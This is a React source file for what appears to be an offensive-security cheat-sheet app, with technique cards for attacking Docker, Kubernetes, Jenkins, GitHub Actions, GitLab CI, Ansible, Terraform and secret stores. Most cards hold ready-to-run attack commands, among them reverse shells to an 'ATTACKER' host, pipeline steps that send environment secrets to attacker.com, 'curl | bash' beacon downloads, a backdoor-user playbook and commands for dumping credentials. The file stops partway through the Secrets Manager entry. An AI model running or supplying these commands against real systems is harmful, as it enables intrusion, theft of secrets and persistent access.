import React, { useState } from 'react';
import TechniqueCard from '../components/TechniqueCard';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'DOCKER',
    color: 'blue',
    nodes: [
      { title: 'Container Escape', subtitle: 'Privileged • socket mount • namespace', id: 'docker-escape' },
      { title: 'Docker Enumeration', subtitle: 'Image analysis • env vars • secrets', id: 'docker-enum' },
    ]
  },
  {
    header: 'KUBERNETES',
    color: 'cyan',
    nodes: [
      { title: 'K8s Enumeration', subtitle: 'kubectl • RBAC • service accounts', id: 'k8s-enum' },
      { title: 'K8s Escalation', subtitle: 'Pod creation • SA token abuse • etcd', id: 'k8s-privesc' },
    ]
  },
  {
    header: 'CI/CD PIPELINES',
    color: 'orange',
    nodes: [
      { title: 'Jenkins', subtitle: 'Groovy script console • credential store', id: 'jenkins' },
      { title: 'GitHub Actions', subtitle: 'Workflow injection • secret exfil • OIDC', id: 'github-actions' },
      { title: 'GitLab CI', subtitle: 'Runner abuse • variable exfil • pipeline', id: 'gitlab-ci' },
    ]
  },
  {
    header: 'CONFIG MGMT',
    color: 'purple',
    nodes: [
      { title: 'Ansible', subtitle: 'Playbook abuse • vault decrypt • inventory', id: 'ansible' },
      { title: 'Terraform', subtitle: 'State file • credentials • provider abuse', id: 'terraform' },
    ]
  },
  {
    header: 'CLOUD SECRETS',
    color: 'red',
    nodes: [
      { title: 'Secrets Management', subtitle: 'HashiCorp Vault • AWS SSM • env injection', id: 'secrets-mgmt' },
    ]
  },
];

const techniques = [
  {
    id: 'docker-escape',
    title: 'Docker Container Escape',
    subtitle: 'Break out of Docker containers to gain access to the host system',
    tags: ['privileged container', 'docker.sock', 'namespace escape', 'cgroup release_agent', 'runc CVE'],
    accentColor: 'blue',
    overview: 'Docker container escape techniques exploit misconfigurations that break the container isolation boundary. A privileged container (--privileged) has all Linux capabilities and can mount host devices directly. A mounted docker.sock lets you spawn new privileged containers from within the current one. The cgroup release_agent technique writes a host-side executable path to the notify_on_release file, triggering code execution on the host when the cgroup is released. The runc CVE-2019-5736 overwrites the host runc binary itself during exec.',
    steps: [
      'ENUMERATE: check capabilities (capsh --decode), look for /.dockerenv, inspect /proc/1/cgroup for docker/k8s markers',
      'CHECK PRIVILEGED: CapEff bitmask 0000003fffffffff = full caps — if privileged, directly mount host disks',
      'CHECK DOCKER SOCKET: ls /var/run/docker.sock — if present, use docker API/CLI to create a new privileged container with host / mounted',
      'CGROUP RELEASE AGENT: if cap_sys_admin is present — mount cgroup, set release_agent to a reverse shell script, trigger via cgroup.procs',
      'PRIVILEGED ESCAPE: fdisk -l to find host disk, mount /dev/sdX to /mnt/host, chroot /mnt/host — now operating as root on host',
      'RUNC CVE-2019-5736: overwrite host runc binary during exec into container — requires root inside container and runc < 1.0-rc6',
    ],
    commands: [
      {
        title: 'Container escape techniques',
        code: `# Check container security context
cat /proc/1/status | grep CapEff   # Capability bitmask
# CapEff: 0000003fffffffff = full capabilities (privileged)
capsh --decode=0000003fffffffff

# Check for docker.sock mount
ls /var/run/docker.sock
mount | grep docker

# Docker socket escape — create new privileged container mounting host
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# Create privileged container with host root mounted:
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create

# Or with docker CLI (if installed inside container)
docker run -v /:/host -it --rm alpine chroot /host sh

# cgroup release_agent escape (privileged container or cap_sys_admin)
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Privileged container — mount host filesystem
# If --privileged, all devices accessible
fdisk -l   # List host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host   # Mount host root disk
chroot /mnt/host /bin/bash  # Chroot into host

# Detect container environment
cat /.dockerenv              # Exists in Docker containers
cat /proc/1/cgroup | grep docker
env | grep -i "docker\|container\|kube"`
      }
    ]
  },
  {
    id: 'docker-enum',
    title: 'Docker Image & Container Enumeration',
    subtitle: 'Extract secrets, credentials, and sensitive data from Docker images and running containers',
    tags: ['docker inspect', 'ENV vars', 'image layers', 'history', 'volumes', 'secrets'],
    accentColor: 'blue',
    overview: 'Docker images and running containers are a rich source of credentials and sensitive configuration. Environment variables are the most common location for database passwords, API keys, and service tokens — docker inspect or env inside the container reveals them immediately. Image layers preserve history: every RUN command and deleted file still exists in prior layers. docker history --no-trunc shows the full build commands, which developers frequently use to pass secrets. The ~/.docker/config.json on the host stores registry auth tokens.',
    steps: [
      'LIST containers and images: docker ps -a, docker images — identify running services and their image versions',
      'DUMP ENV VARS: docker inspect <ID> | jq .[0].Config.Env — look for *_PASSWORD, *_TOKEN, *_KEY, DATABASE_URL patterns',
      'CHECK VOLUME MOUNTS: docker inspect <ID> | jq .[0].HostConfig.Binds — sensitive host paths mounted in?',
      'LAYER ANALYSIS: docker history --no-trunc <IMAGE> — full RUN commands may contain secrets passed as build args',
      'EXPORT AND INSPECT: docker save <IMAGE> | tar x — extract and grep each layer.tar for passwd, shadow, key, cred',
      'REGISTRY AUTH: cat ~/.docker/config.json — base64-encoded registry credentials for Docker Hub and private registries',
    ],
    commands: [
      {
        title: 'Docker enumeration and secret extraction',
        code: `# List running containers and images
docker ps -a
docker images

# Inspect container configuration
docker inspect <CONTAINER_ID>
docker inspect <CONTAINER_ID> | jq '.[0].Config.Env'   # Environment variables
docker inspect <CONTAINER_ID> | jq '.[0].HostConfig.Binds'   # Volume mounts
docker inspect <CONTAINER_ID> | jq '.[0].NetworkSettings'    # Network config

# Get shell in running container
docker exec -it <CONTAINER_ID> /bin/sh

# Environment variables (often contain credentials)
docker exec <CONTAINER_ID> env
# or from inside container:
env | grep -i "pass\|secret\|key\|token\|db\|url\|host"

# Image layer analysis
docker history <IMAGE>        # Show build history
docker history --no-trunc <IMAGE>   # Full commands (reveals secrets in RUN)

# Dive — interactive layer inspector
dive <IMAGE>   # Browse filesystem changes per layer

# Export image and inspect all layers
docker save <IMAGE> -o image.tar
tar xf image.tar
# Inspect each layer:
for layer in */layer.tar; do tar tf $layer; done | grep -i "passwd\|shadow\|key\|cred"

# Extract files from image
docker create --name tmp <IMAGE>
docker cp tmp:/etc/passwd ./passwd
docker rm tmp

# Check for secrets in container filesystem
docker exec <CONTAINER> find / -name "*.env" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
docker exec <CONTAINER> cat /app/.env

# Registry authentication (steal credentials)
cat ~/.docker/config.json   # Docker Hub / registry auth tokens
cat /root/.docker/config.json`
      }
    ]
  },
  {
    id: 'k8s-enum',
    title: 'Kubernetes Enumeration',
    subtitle: 'Enumerate Kubernetes cluster resources, permissions, and service account tokens',
    tags: ['kubectl', 'RBAC', 'service account', 'token', 'namespaces', 'secrets', 'ClusterRole'],
    accentColor: 'cyan',
    overview: 'Every Kubernetes pod has a service account token automatically mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. This token authenticates to the Kubernetes API server and may have overly permissive RBAC bindings. kubectl auth can-i --list reveals the full permission set of the current SA. Secrets in accessible namespaces frequently contain database passwords, API keys, and TLS certificates. The kubelet API on port 10250 is often unauthenticated and exposes pod listings and exec endpoints directly without going through the API server.',
    steps: [
      'READ MOUNTED TOKEN: cat /var/run/secrets/kubernetes.io/serviceaccount/token — always present in pods unless explicitly disabled',
      'TEST API ACCESS: curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces',
      'ENUMERATE PERMISSIONS: kubectl auth can-i --list — see exactly what the current SA can do across all API groups',
      'LIST SECRETS: kubectl get secrets --all-namespaces — if allowed, read with kubectl get secret <NAME> -o yaml and base64 -d',
      'FIND PRIVILEGED SAS: kubectl get clusterrolebindings -o json | jq to find SAs bound to cluster-admin',
      'CHECK KUBELET: curl -sk https://NODE_IP:10250/pods — often unauthenticated; also try /runningpods and /exec endpoints',
    ],
    commands: [
      {
        title: 'Kubernetes enumeration techniques',
        code: `# From inside a pod — access K8s API using mounted token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Test API access
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Using kubectl (if available in pod or from outside)
kubectl auth can-i --list   # List all permissions of current SA
kubectl auth can-i create pods
kubectl auth can-i get secrets

# Enumerate cluster resources
kubectl get all --all-namespaces
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl get clusterrolebindings

# Read secrets (if allowed)
kubectl get secret <SECRET_NAME> -o yaml
kubectl get secret <SECRET_NAME> -o jsonpath='{.data}' | base64 -d

# Find highly privileged service accounts
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# kubeletctl — interact with kubelet API directly (often unauthenticated on port 10250)
curl -sk https://NODE_IP:10250/pods | jq .
curl -sk https://NODE_IP:10250/runningpods | jq .

# kube-hunter — automated K8s vulnerability scanner
docker run --rm -it aquasec/kube-hunter --remote NODE_IP
kube-hunter --pod     # Run from inside a pod

# Get ETCD address (often has all cluster secrets unencrypted)
kubectl get pods -n kube-system | grep etcd`
      }
    ]
  },
  {
    id: 'k8s-privesc',
    title: 'Kubernetes Privilege Escalation',
    subtitle: 'Escalate privileges in Kubernetes via pod creation, SA token abuse, and etcd access',
    tags: ['privileged pod', 'hostPID', 'hostPath', 'SA token', 'etcd', 'node shell', 'RBAC escalation'],
    accentColor: 'cyan',
    overview: 'If the current service account has the "create pods" verb, cluster ownership is trivial: deploy a pod with hostPID:true, hostNetwork:true, and a hostPath volume mounting / — then chroot /host for a root shell on the underlying node. From any node, etcd can be queried directly to dump all cluster secrets in plaintext (etcd does not encrypt at rest by default). RBAC impersonation (if the SA has impersonate verbs) allows acting as any user including cluster-admin without needing their token.',
    steps: [
      'CHECK CREATE PODS: kubectl auth can-i create pods — if yes, deploy a privileged pod with hostPath:/ and chroot to escape to node',
      'STEAL SA TOKENS: kubectl exec -it <privileged-pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token — pivot to higher-priv SA',
      'ETCD DUMP: from master node, use etcdctl with cluster certs to dump /registry/secrets — returns all K8s secrets unencrypted',
      'RBAC IMPERSONATION: kubectl get secrets --as=system:serviceaccount:kube-system:default — act as any SA if impersonate verb is granted',
      'ROLEBINDING ESCALATION: kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default',
      'NODE SHELL: kubectl debug node/NODE_NAME -it --image=ubuntu then chroot /host — root shell on the underlying node (K8s 1.18+)',
    ],
    commands: [
      {
        title: 'Kubernetes privilege escalation',
        code: `# Create privileged pod with host filesystem mounted
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "tail -f /dev/null"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Get shell in the pod and escape to host
kubectl exec -it attacker-pod -- /bin/sh
chroot /host /bin/bash   # Now on the node as root

# Steal service account token from privileged pod
kubectl exec -it target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use that token:
export TOKEN=<STOLEN_TOKEN>
kubectl --token=$TOKEN auth can-i --list

# etcd direct access (from master node or if etcd is exposed)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only

# Get all secrets from etcd
ETCDCTL_API=3 etcdctl get /registry/secrets --prefix | strings | grep -A5 "password\|token"

# RBAC impersonation
kubectl get secrets --as=system:serviceaccount:kube-system:default
kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default

# Node shell (kubectl debug — K8s 1.18+)
kubectl debug node/NODE_NAME -it --image=ubuntu
chroot /host /bin/bash`
      }
    ]
  },
  {
    id: 'jenkins',
    title: 'Jenkins Attack & Exploitation',
    subtitle: 'Exploit Jenkins for code execution, credential theft, and pipeline abuse',
    tags: ['Groovy Script Console', 'credential store', 'build executor', 'pipeline', 'JNLP agent', 'Jenkins CLI'],
    accentColor: 'orange',
    overview: 'Jenkins is one of the most commonly misconfigured systems in enterprise environments. The Script Console at /script executes arbitrary Groovy code in the Jenkins JVM process — trivial RCE if exposed. Jenkins stores credentials (SSH keys, API tokens, passwords) encrypted with a master key derived from secrets/master.key and secrets/hudson.util.Secret. Offline decryption is possible if you can read those files. Injecting a malicious Jenkinsfile into any repository triggers pipeline execution on the next build, with full access to injected secrets.',
    steps: [
      'PROBE: curl http://jenkins:8080/api/json — anonymous access? Check /script and /manage for admin panel exposure',
      'SCRIPT CONSOLE RCE: navigate to Manage Jenkins > Script Console — execute Groovy: ["bash","-c","id"].execute().text',
      'DUMP CREDENTIALS: use Groovy via Script Console to iterate the credential store and decrypt all stored passwords and API tokens',
      'OFFLINE DECRYPTION: if you have Jenkins home dir, grab secrets/master.key + secrets/hudson.util.Secret + credentials.xml — decrypt offline with jenkins-decrypt.py',
      'PIPELINE INJECTION: modify the Jenkinsfile in a target repository to add a step that exfiltrates env (all injected secrets) to attacker URL',
      'BUILD LOG HARVEST: curl /job/PROJECT/lastBuild/consoleText — build logs often contain credentials echoed by developers',
    ],
    commands: [
      {
        title: 'Jenkins exploitation techniques',
        code: `# Check for anonymous access
curl http://jenkins.corp.local:8080/api/json
curl http://jenkins.corp.local:8080/script   # Script console (if accessible)

# Script Console — Groovy RCE (Jenkins admin)
# Navigate to: Manage Jenkins → Script Console
# Execute:
println "whoami".execute().text
println ["bash", "-c", "id"].execute().text
["bash", "-c", "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"].execute()

# Decrypt Jenkins credentials
# Method 1: via Groovy Script Console
import hudson.util.Secret
def credStore = jenkins.model.Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]
credStore.getCredentials(com.cloudbees.plugins.credentials.domains.Domain.global()).each { cred ->
  println cred.id + " : " + cred.password?.plainText
}

# Method 2: offline decryption (if you have Jenkins home dir)
# Files needed: secrets/master.key, secrets/hudson.util.Secret
# Tool: jenkins-decrypt.py
python3 jenkins-decrypt.py master.key hudson.util.Secret credentials.xml

# Jenkins CLI (if accessible)
java -jar jenkins-cli.jar -s http://jenkins.corp.local:8080/ -auth user:pass who-am-i
java -jar jenkins-cli.jar -s http://jenkins.corp.local:8080/ -auth user:pass groovy =   < cmd.groovy

# Malicious Jenkinsfile (inject into repository)
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        sh 'env | curl -X POST -d @- http://ATTACKER/exfil'  // Exfil all env vars/secrets
        sh 'curl -s http://ATTACKER/beacon | bash'
      }
    }
  }
}

# Access build logs (may contain credentials printed to console)
curl http://jenkins.corp.local:8080/job/project/lastBuild/consoleText -u user:pass`
      }
    ]
  },
  {
    id: 'github-actions',
    title: 'GitHub Actions — Pipeline & Secret Exfiltration',
    subtitle: 'Abuse GitHub Actions workflows for secret exfiltration and pipeline injection',
    tags: ['GITHUB_TOKEN', 'secrets', 'workflow injection', 'OIDC', 'pull request', 'environment'],
    accentColor: 'orange',
    overview: 'GitHub Actions workflows execute with access to repository secrets (${{ secrets.* }}) and the automatic GITHUB_TOKEN. The pull_request_target trigger is particularly dangerous: it runs with write permissions and access to secrets even for PRs from forks — if the workflow checks out untrusted PR code and uses it in shell steps, it is trivially injectable. OIDC integration allows workflows to obtain short-lived cloud provider credentials (AWS, GCP, Azure) without storing static keys — if the trust policy is too broad, any attacker-controlled repo can assume the cloud role.',
    steps: [
      'ENUMERATE: find .github/workflows/*.yml — identify triggers (push, pull_request_target, workflow_dispatch), permissions, and secret references',
      'INJECT VIA WORKFLOW: add a step to an existing workflow or create a new one — exfiltrate env | base64 to attacker URL to capture all secrets',
      'PULL_REQUEST_TARGET INJECTION: submit a PR that modifies a script path referenced by a pull_request_target workflow — the PR code runs with repo-level secrets',
      'GITHUB_TOKEN ABUSE: use the automatic token to read other repos, create releases, modify branch protections, or pivot to other workflows',
      'OIDC CREDENTIAL THEFT: if id-token: write permission exists and cloud OIDC is configured, request short-lived cloud credentials within the workflow',
      'SELF-HOSTED RUNNER: add a workflow step with a reverse shell or beacon download — self-hosted runners execute on internal infrastructure',
    ],
    commands: [
      {
        title: 'GitHub Actions attack techniques',
        code: `# Enumerate workflow files
ls .github/workflows/
cat .github/workflows/ci.yml

# Secret exfiltration via malicious workflow step
# Add to existing workflow or create new one:
- name: Exfil
  run: |
    env | base64 | curl -X POST https://attacker.com/ -d @-
    echo "$\{{ secrets.AWS_ACCESS_KEY_ID }}" | curl -X POST https://attacker.com/key -d @-

# Inject into pull_request_target workflow (classic injection)
# Workflow that checks out PR code and uses it insecurely:
# - uses: actions/checkout@v3
#   with:
#     ref: $\{{ github.event.pull_request.head.ref }}   # <- untrusted!
# Submit PR with malicious script in the workflow path

# OIDC cloud credential abuse
# If workflow has id-token: write permission and cloud OIDC is configured:
- name: Get AWS creds via OIDC
  uses: aws-actions/configure-aws-credentials@v2
  with:
    role-to-assume: arn:aws:iam::ACCOUNT:role/GitHubActions
    aws-region: us-east-1
- run: aws sts get-caller-identity  # Now have AWS access

# Self-hosted runner compromise
# Workflow runs on runner machine — get shell via:
- name: Backdoor
  run: |
    curl http://ATTACKER/beacon | bash

# GITHUB_TOKEN abuse (read other repos, create releases, modify code)
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/ORG/REPO/contents/ | jq '.[].name'

# List all secrets (if you have admin access)
gh secret list --repo ORG/REPO
gh api repos/ORG/REPO/actions/secrets`
      }
    ]
  },
  {
    id: 'gitlab-ci',
    title: 'GitLab CI/CD — Runner & Variable Abuse',
    subtitle: 'Exploit GitLab CI pipelines for secret exfiltration, runner abuse, and lateral movement',
    tags: ['CI_JOB_TOKEN', 'CI variables', 'runner', 'pipeline injection', 'protected branch', 'GitLab API'],
    accentColor: 'orange',
    overview: 'GitLab CI automatically injects a CI_JOB_TOKEN into every pipeline job, which grants API access to other group projects. CI/CD variables (Settings > CI/CD > Variables) are the primary credential store — masked variables hide values in logs but they are still accessible in the job environment. Protected variables are restricted to protected branches, but if you can push to a protected branch (or unprotect one via API), you can trigger a pipeline with access to those secrets. Self-hosted or shared runners execute on actual infrastructure, making workflow injection a direct path to internal network access.',
    steps: [
      'ENUMERATE: read .gitlab-ci.yml — identify stages, variables referenced, and runner tags; check project CI/CD settings for exposed variable names',
      'INJECT VIA PIPELINE: push a modified .gitlab-ci.yml (or fork and open an MR) with a step that exfiltrates env — captures all CI variables including tokens',
      'CI_JOB_TOKEN ABUSE: use the token to call GitLab API (/api/v4/projects) and download source code from any accessible group project',
      'UNPROTECT BRANCH (if admin): DELETE /api/v4/projects/ID/protected_branches/main — now pipelines on main can access protected variables without restrictions',
      'ROGUE RUNNER: if you obtain a runner registration token, register a malicious runner tagged to match production jobs — your runner executes production pipeline steps',
      'CONTAINER REGISTRY: docker login with CI_JOB_TOKEN → pull production images → docker inspect for env vars and secrets baked into image layers',
    ],
    commands: [
      {
        title: 'GitLab CI/CD attack techniques',
        code: `# Exfiltrate CI variables via malicious .gitlab-ci.yml
exfil-secrets:
  script:
    - env | base64 | curl -X POST https://attacker.com/exfil -d @-
    - echo "$CI_JOB_TOKEN" | curl -X POST https://attacker.com/token -d @-
    - curl -H "PRIVATE-TOKEN: $SECRET_TOKEN" https://gitlab.corp.local/api/v4/projects

# CI_JOB_TOKEN — access GitLab API
curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.corp.local/api/v4/projects"

# List all groups accessible
curl -H "PRIVATE-TOKEN: <TOKEN>" https://gitlab.corp.local/api/v4/groups

# Download other project repositories
curl -H "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.corp.local/api/v4/projects/PROJECT_ID/repository/archive"

# Runner registration token (if you have admin access — register rogue runner)
curl -H "PRIVATE-TOKEN: <admin-token>" \
  "https://gitlab.corp.local/api/v4/runners/registration_token"
# Register rogue runner:
gitlab-runner register \
  --url https://gitlab.corp.local \
  --registration-token RUNNER_TOKEN \
  --executor shell \
  --tag-list "production,deploy"

# Protect branch bypass (unprotect → get variables → reprotect)
curl -H "PRIVATE-TOKEN: <TOKEN>" -X DELETE \
  "https://gitlab.corp.local/api/v4/projects/PROJECT_ID/protected_branches/main"
# Now pipeline on 'main' runs without protected variable restrictions

# GitLab container registry (often has image pull credentials)
docker login gitlab.corp.local:5050 -u user -p $CI_JOB_TOKEN
docker pull gitlab.corp.local:5050/group/project:latest
docker inspect gitlab.corp.local:5050/group/project:latest | jq '.[0].Config.Env'`
      }
    ]
  },
  {
    id: 'ansible',
    title: 'Ansible Attack & Credential Extraction',
    subtitle: 'Exploit Ansible for credential extraction, lateral movement, and playbook abuse',
    tags: ['ansible-vault', 'inventory', 'become', 'host_vars', 'group_vars', 'ANSIBLE_VAULT_PASSWORD'],
    accentColor: 'purple',
    overview: 'Ansible controllers are high-value targets because they hold SSH credentials and run as root (via become: yes) across entire infrastructure fleets. The inventory file lists every managed host, often with ansible_ssh_pass or ansible_password in plaintext or encrypted with ansible-vault. The vault password is frequently stored in a .vault_pass file, an environment variable (ANSIBLE_VAULT_PASSWORD_FILE), or hardcoded in CI pipeline variables. Compromising the Ansible controller is effectively a one-command path to root on every managed server via ansible all -m shell -a "..." --become.',
    steps: [
      'LOCATE FILES: find / -name ansible.cfg -o -name inventory -o -name "*.yml" 2>/dev/null — identify controller node and inventory locations',
      'READ INVENTORY: cat /etc/ansible/hosts or inventory.ini — lists all managed hosts; look for ansible_ssh_pass and ansible_password fields',
      'FIND VAULT PASSWORD: check ansible.cfg for vault_password_file, grep env for ANSIBLE_VAULT_PASSWORD, find .vault_pass files',
      'DECRYPT VAULT: ansible-vault decrypt --vault-password-file .vault_pass encrypted.yml — or crack with ansible2john + hashcat/john',
      'EXECUTE ON ALL HOSTS: ansible all -m shell -a "whoami" --become — confirms root access across all managed systems',
      'DEPLOY BACKDOOR: ansible-playbook pwn.yml --vault-password-file .vault_pass — add SSH key to root, create backdoor user, or drop beacon',
    ],
    commands: [
      {
        title: 'Ansible exploitation techniques',
        code: `# Find Ansible files
find / -name "ansible.cfg" -o -name "*.yml" -path "*/ansible/*" 2>/dev/null
find / -name "inventory" -o -name "hosts" -path "*/ansible/*" 2>/dev/null

# Read inventory — contains all managed hosts
cat /etc/ansible/hosts
cat inventory
cat inventory.ini

# Look for credentials in host_vars and group_vars
find . -name "*.yml" | xargs grep -l "ansible_ssh_pass\|ansible_password\|vault_"
cat group_vars/all.yml
cat host_vars/TARGET.yml

# Find vault password file
find / -name ".vault_pass" -o -name "vault_password_file" 2>/dev/null
cat ansible.cfg | grep vault_password_file
env | grep -i vault

# Decrypt ansible-vault encrypted string
ansible-vault decrypt --vault-password-file .vault_pass encrypted_file.yml
# Or crack vault password:
# Extract vault header: $ANSIBLE_VAULT;1.1;AES256
ansible2john vault.yml > vault.hash
john --wordlist=rockyou.txt vault.hash

# Run ad-hoc command on all hosts (from controller)
ansible all -m shell -a "whoami" --become
ansible all -m shell -a "cat /etc/shadow" --become
ansible all -m shell -a "curl http://ATTACKER/beacon | bash" --become

# Malicious playbook (if you can write/modify playbooks)
cat > pwn.yml << 'EOF'
- hosts: all
  become: yes
  tasks:
    - name: Add backdoor user
      user:
        name: svc_backup
        password: "{{ 'Backdoor123!' | password_hash('sha512') }}"
        groups: sudo
        shell: /bin/bash
    - name: Add SSH key
      authorized_key:
        user: root
        key: "ssh-rsa ATTACKER_PUB_KEY"
EOF
ansible-playbook pwn.yml --vault-password-file .vault_pass`
      }
    ]
  },
  {
    id: 'terraform',
    title: 'Terraform State & Credential Abuse',
    subtitle: 'Extract credentials and sensitive data from Terraform state files and configurations',
    tags: ['terraform.tfstate', 'backend', 'S3 state', 'provider credentials', 'tfvars', 'workspace'],
    accentColor: 'purple',
    overview: 'Terraform state files (terraform.tfstate) are JSON documents containing the complete current state of managed infrastructure — including all resource attributes, which frequently include database passwords, connection strings, generated API keys, and TLS certificates in plaintext. Remote state stored in S3/GCS/Azure Blob is often protected only by IAM/ACL policies. If you compromise a cloud role with S3 read access, you can download state for all workspaces. Terraform Cloud workspace variables are the credential store for many organisations — accessible via a stolen user/team token.',
    steps: [
      'FIND STATE FILES: find / -name "*.tfstate" -o -name "*.tfvars" 2>/dev/null — local state is often committed to repos by mistake',
      'PARSE LOCAL STATE: cat terraform.tfstate | jq .resources[].instances[].attributes — extract passwords, connection strings, generated secrets',
      'REMOTE STATE (S3): aws s3 cp s3://BUCKET/terraform/terraform.tfstate /tmp/ — then jq to extract db passwords, API keys from resource attributes',
      'TFVARS EXTRACTION: grep -i "key\\|secret\\|password\\|token" *.tfvars *.auto.tfvars — variables passed at plan/apply time, often contain cloud credentials',
      'PROVIDER HARDCODED CREDS: grep -r "access_key\\|secret_key\\|client_secret" *.tf — providers sometimes have credentials hardcoded',
      'TERRAFORM CLOUD API: GET /api/v2/workspaces/WS_ID/vars with stolen token — workspace variables contain cloud provider credentials used for provisioning',
    ],
    commands: [
      {
        title: 'Terraform credential extraction',
        code: `# Find Terraform files
find / -name "*.tfstate" -o -name "*.tfvars" -o -name "terraform.tf" 2>/dev/null

# Read local state (often contains plaintext secrets)
cat terraform.tfstate | jq .
cat terraform.tfstate | jq '.resources[].instances[].attributes'

# Extract sensitive outputs
terraform show -json | jq '.values.outputs'

# Remote state — S3 backend
aws s3 ls s3://BUCKET/terraform/
aws s3 cp s3://BUCKET/terraform/terraform.tfstate /tmp/
cat /tmp/terraform.tfstate | jq '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes | {password, username, endpoint}'

# GCS state backend
gsutil cat gs://BUCKET/terraform/default.tfstate | jq .

# Azure blob state
az storage blob download --container-name tfstate --name terraform.tfstate --file state.json

# .tfvars credential extraction
cat terraform.tfvars
cat *.auto.tfvars
# Look for:
grep -i "key\|secret\|password\|token\|credential" *.tfvars

# Provider config with hardcoded creds
grep -r "access_key\|secret_key\|client_secret\|subscription_id" *.tf

# Terraform Cloud API (if you have user/team token)
curl -H "Authorization: Bearer $TERRAFORM_CLOUD_TOKEN" \
  https://app.terraform.io/api/v2/organizations/ORG/workspaces | jq '.data[].id'
# Get workspace vars (may contain cloud creds)
curl -H "Authorization: Bearer $TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS_ID/vars" | jq '.data[].attributes'

# Terraform state manipulation (if you have write access — backdoor infrastructure)
terraform state pull > current.tfstate
# Modify current.tfstate to add your SSH key to existing resources
terraform state push modified.tfstate`
      }
    ]
  },
  {
    id: 'secrets-mgmt',
    title: 'Secrets Management Exploitation',
    subtitle: 'Exploit HashiCorp Vault, AWS SSM, and misconfigured secret stores to extract credentials',
    tags: ['HashiCorp Vault', 'AWS SSM', 'AWS Secrets Manager', 'env injection', 'token', 'AppRole'],
    accentColor: 'red',
    overview: 'Secrets management systems are valuable targets because they centralise all credentials. HashiCorp Vault tokens are commonly leaked in environment variables, ~/.vault-token, or process environ — a stolen token with list+read policies gives access to every secret path it covers. AWS IMDS (169.254.169.254) on any EC2 instance provides temporary IAM role credentials that are valid for the role\'s full permission set — including access to SSM Parameter Store and Secrets Manager. IMDSv1 requires no pre-authentication; IMDSv2 requires a one-step PUT to get a session token first.',
    steps: [
      'VAULT TOKEN HUNT: echo $VAULT_TOKEN, cat ~/.vault-token, grep /proc/*/environ for VAULT_TOKEN — service processes commonly have it in their environment',
      'VAULT SECRET DUMP: vault secrets list then vault kv list secret/ and vault kv get secret/DATABASE — enumerate and read all accessible paths',
      'AWS IMDS (IMDSv1): curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME — instant temporary credentials, no auth required',
      'AWS IMDS (IMDSv2): first PUT to /latest/api/token with TTL header → use returned token in X-aws-ec2-metadata-token header for credential request',
      'AWS SSM: aws ssm get-parameters-by-path --path / --recursive --with-decryption — dumps all SSM parameters including SecureString values',
      'AWS SECRETS MANAGER: aws secretsmanager list-secrets then get-secret-value --secret-id NAME — retrieves database passwords, API keys, TLS private keys',
    ],
    commands: [
      {
        title: 'Secrets management exploitation',
        code: `# HashiCorp Vault
# Find Vault token
echo $VAULT_TOKEN
cat ~/.vault-token
grep -r "VAULT_TOKEN\|vault_token" /etc /app /home 2>/dev/null

# Check Vault token from process env (root)
for pid in $(pgrep -f vault); do
  cat /proc/$pid/environ | tr '\\0' '\\n' | grep VAULT
done

# Vault API — list and read secrets (with stolen token)
export VAULT_TOKEN=<STOLEN_TOKEN>
vault secrets list
vault kv list secret/
vault kv get secret/database
vault kv get secret/aws

# Vault AppRole — if you have role_id and secret_id
curl -X POST http://vault.corp.local:8200/v1/auth/approle/login \
  -d '{"role_id":"<ROLE_ID>","secret_id":"<SECRET_ID>"}' | jq '.auth.client_token'

# AWS Secrets Manager
